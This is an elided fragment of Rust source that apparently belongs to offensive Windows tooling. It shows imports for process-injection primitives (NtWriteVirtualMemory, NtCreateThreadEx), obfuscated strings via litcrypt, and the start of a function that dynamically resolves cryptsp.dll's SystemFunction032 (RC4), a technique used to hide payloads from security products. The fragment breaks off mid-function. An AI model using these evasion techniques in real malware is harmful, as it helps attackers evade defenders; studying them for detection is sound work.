...
use data::{ApiSetNamespace, ApiSetNamespaceEntry, ApiSetValueEntry, DLL_PROCESS_ATTACH, EAT, EntryPoint, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, 
    ...
    PAGE_READONLY, NtWriteVirtualMemoryArgs, ExceptionHandleFunction, PS_ATTRIBUTE_LIST, NtCreateThreadExArgs, LptopLevelExceptionFilter,ustring};
use libc::c_void;
use litcrypt::lc;
use winproc::Process;
...
pub fn system_function_032(data: *mut ustring, key: *const ustring) -> i32 {
    unsafe {
        let ret;
        let cryptsp = load_library_a("cryptsp.dll");
        let func_ptr: data::SystemFunction032;
        let addr = get_function_address(cryptsp, &lc!("SystemFunction032")) as usize;

        dynamic_invoke!(cryptsp,&lc!("SystemFunction032"),func_ptr,ret,data,key);
